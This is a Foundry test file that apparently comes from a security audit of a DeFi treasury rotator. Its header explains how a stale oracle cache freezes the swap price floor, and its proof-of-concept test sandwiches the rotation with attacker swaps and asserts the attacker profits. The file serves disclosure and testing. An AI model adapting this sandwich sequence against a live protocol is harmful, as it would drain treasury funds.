// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console2} from "forge-std/Test.sol";
import {YBase} from "./YBase.sol";
import {QuoteRotator} from "../../cauldron/QuoteRotator.sol";
import {QuoteOracle} from "../../cauldron/QuoteOracle.sol";
import {MockAggregator} from "../../cauldron/MockAggregator.sol";
import {TreasuryGovernor, IVotes721} from "../../cauldron/TreasuryGovernor.sol";
import {MockQuoteToken} from "../../cauldron/MockQuoteToken.sol";
import {PoolOps, IPositionManagerOps} from "../../cauldron/PoolOps.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";
import {IERC20Minimal} from "v4-core/src/interfaces/external/IERC20Minimal.sol";

/**
 * ═══════════════════════════════════════════════════════════════════════════
 * T02 — THE ROTATION'S PRICE FLOOR IS BUILT ON A CACHE THAT NEVER EXPIRES
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * `QuoteRotator.swapOnce` (:365-366) is the only price guard on a
 * permissionless rotation slice:
 *
 *     uint256 floor = _oracleFloor(from, to, amountIn);
 *     if (out < (minOut > floor ? minOut : floor)) revert SlippageTooHigh();
 *
 * `_oracleFloor` -> `_usd` -> `QuoteOracle.cachedUsdPerRawUnit`, and that
 * function (QuoteOracle.sol:305-312) re-stamps the cache's TIMESTAMP on every
 * attempt but only overwrites the FACTOR on success:
 *
 *     if (block.timestamp <= c.at + TTL && c.factor != 0) return c.factor;
 *     uint256 fresh = this.usdPerRawUnit(quote);
 *     c.at = uint64(block.timestamp);
 *     if (fresh > 0) c.factor = fresh;
 *     return c.factor;
 *
 * A feed that stops answering therefore pins the floor at the last price it
 * ever reported, with no bound on age and no on-chain signal. The floor's
 * documented tolerance is `rotationSlipBps` (3%). This measures what the real
 * tolerance becomes once the market has moved away from a frozen price.
 * ═══════════════════════════════════════════════════════════════════════════
 */
contract T02_StaleFloorSandwich is YBase {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    QuoteRotator internal rotator;
    TreasuryGovernor internal governor;
    MockQuoteToken internal usdg;
    QuoteOracle internal oracle;
    MockAggregator internal ethFeed;

    // Venue seeded at 3,000 USDG per ETH.
    uint256 internal constant VENUE_ETH = 60 ether;
    uint256 internal constant VENUE_USDG = 180_000e6;

    function setUp() public {
        _boot(20 ether, 0);
        if (!active) return;

        usdg = new MockQuoteToken("Magic USD", "USDG", 6);
        registry.setAllowedQuote(address(usdg), true, 1e18);

        oracle = new QuoteOracle(address(this));
        ethFeed = new MockAggregator("ETH/USD", 3_000e8);
        oracle.setFeed(address(0), address(ethFeed), 1 hours, 18);
        oracle.setPegged(address(usdg), 6);

        rotator = new QuoteRotator(address(registry), pm);
        rotator.setArbParams(address(oracle), 1000, 5e18);   // wires quoteOracle
        governor = new TreasuryGovernor(
            IVotes721(address(new FVotes())), address(registry), address(this), 0, 0, 0, 0, false
        );
        governor.setQuoteOracle(address(oracle));
        registry.setRotationWiring(address(rotator), address(governor));

        usdg.mint(address(this), VENUE_USDG);
        PoolOps.openOrAddPair(
            pm, IPositionManagerOps(posm), address(0),
            address(usdg), address(0), VENUE_ETH, VENUE_USDG, 60, 3000
        );
        rotator.setVenue(_venue(), true);

        // Warm the cache while the feed is healthy and agrees with the venue.
        oracle.cachedUsdPerRawUnit(address(0));
    }

    function _venue() internal view returns (PoolKey memory) {
        return PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(address(usdg)),
            fee: 3000, tickSpacing: 60, hooks: IHooks(address(0))
        });
    }

    function _approve() internal {
        uint256 id = governor.propose(address(usdg), 2500);
        vm.roll(vm.getBlockNumber() + 1);
        governor.vote(id, true);
        _warp(governor.VOTING_PERIOD() + 1);
        governor.execute(id);
    }

    /// @dev USDG per whole ETH implied by the venue's spot price.
    function _venuePrice() internal view returns (uint256) {
        (uint160 s,,,) = pm.getSlot0(_venue().toId());
        // price(1 per 0) = (s/Q96)^2, raw USDG per wei; x1e18/1e6 -> per ETH.
        uint256 q96 = 79228162514264337593543950336;
        uint256 a = (uint256(s) * 1e9) / q96;
        return (a * a * 1e18) / (1e18 * 1e6);
    }

    /// @dev ETH -> USDG on the venue (pushes the ETH price DOWN).
    function _pushDown(uint256 ethIn, address who) internal returns (uint256 usdgOut) {
        bytes memory r = pm.unlock(
            abi.encode(OP_SWAP, abi.encode(YSwap(true, -int256(ethIn), address(this), who)), _venue())
        );
        (, int128 a1) = abi.decode(r, (int128, int128));
        usdgOut = uint256(uint128(a1));
    }

    /// @dev USDG -> ETH on the venue (pushes the ETH price UP).
    function _pushUp(uint256 usdgIn, address who) internal returns (uint256 ethOut) {
        if (usdg.balanceOf(address(this)) < usdgIn) usdg.mint(address(this), usdgIn - usdg.balanceOf(address(this)));
        bytes memory r = pm.unlock(
            abi.encode(OP_SWAP, abi.encode(YSwap(false, -int256(usdgIn), address(this), who)), _venue())
        );
        (int128 a0,) = abi.decode(r, (int128, int128));
        ethOut = uint256(uint128(a0));
    }

    // -----------------------------------------------------------------------

    /// @notice CONTROL — a LIVE feed rejects the same attack.
    function test_T02_CONTROL_LiveFeedRejectsThePushedVenue() public {
        vm.skip(!active);

        // The market moves: ETH is now worth ~40% more, on the venue AND on the
        // feed (an ordinary, honest repricing).
        _pushUp(60_000e6, address(this));
        ethFeed.peg(int256(_venuePrice()) * 1e8);
        console2.log("venue price after the move (USDG/ETH):", _venuePrice());

        _approve();

        // The attacker depresses the venue and tries to rotate into it.
        _pushDown(18 ether, attacker);
        console2.log("venue price after the push  (USDG/ETH):", _venuePrice());

        vm.expectRevert();                     // SlippageTooHigh
        registry.rotateSlice(2500, 0, _venue());

        console2.log("live feed: the oracle floor REJECTED the pushed fill");
        bool reached = true;
        assertTrue(reached, "T02 stale-floor control reached its assertions");
    }

    /// @notice POC — with the feed merely NOT ANSWERING, the identical attack
    /// succeeds, because the floor is still quoting the pre-outage price.
    function test_T02_POC_FrozenCacheLetsAPushedVenueFillTheSlice() public {
        vm.skip(!active);

        // Same honest market move...
        _pushUp(60_000e6, address(this));
        uint256 fairPrice = _venuePrice();

        // ...but the aggregator has retired / lost access / been migrated. Every
        // fresh read resolves to 0 inside `usdPerRawUnit`'s try/catch.
        ethFeed.setDown(true);
        _warp(30 days);
        uint256 served = oracle.cachedUsdPerRawUnit(address(0));
        (, uint64 at) = oracle.cache(address(0));

        console2.log("venue price, true (USDG/ETH) :", fairPrice);
        console2.log("oracle still serves (USD*1e18/wei):", served);
        console2.log("cache age the oracle reports (s) :", vm.getBlockTimestamp() - at);
        assertLe(vm.getBlockTimestamp() - at, oracle.TTL(), "reported fresh, 30 days old");
        assertFalse(oracle.priceable(address(0)), "and priceable() disagrees with the cache");

        _approve();

        // ── THE SANDWICH ────────────────────────────────────────────────────
        // Push the venue down to just ABOVE the frozen floor (3,000 * 0.97 =
        // 2,910), which is the most the guard can still be made to accept.
        uint256 spentEth;
        uint256 grabbed;
        for (uint256 i; i < 40; ++i) {
            if (_venuePrice() <= 3700) break;
            grabbed += _pushDown(1 ether, attacker);
            spentEth += 1 ether;
        }
        uint256 pushedPrice = _venuePrice();
        console2.log("attacker ETH deployed        :", spentEth);
        console2.log("venue price after the push   :", pushedPrice);

        (uint256 moved,) = registry.rotateSlice(2500, 0, _venue());

        // The attacker unwinds against the treasury's own fill.
        vm.prank(attacker);
        usdg.transfer(address(this), grabbed);
        uint256 back = _pushUp(grabbed, attacker);

        console2.log("slice filled at (USDG)       :", moved);
        console2.log("attacker ETH recovered       :", back);

        assertGt(moved, 0, "the rotation executed where the CONTROL reverted");
        // The floor is documented to permit `rotationSlipBps` = 3%. Measure the
        // shortfall it actually permitted.
        uint256 shortfallBps = 10_000 - (pushedPrice * 10_000) / fairPrice;
        console2.log("shortfall vs true market, bps:", shortfallBps);
        assertGt(shortfallBps, 300 * 10, "the real tolerance is >10x the documented 3%");
        assertGt(back, spentEth, "the attacker is net-ETH-positive on the round trip");

        bool reached = true;
        assertTrue(reached, "T02 stale-floor sandwich reached its assertions");
    }
}

contract FVotes {
    function getVotes(address) external pure returns (uint256) { return 1000; }
    function getPastVotes(address, uint256) external pure returns (uint256) { return 1000; }
    function totalSupply() external pure returns (uint256) { return 1000; }
    function balanceOf(address) external pure returns (uint256) { return 1000; }
}
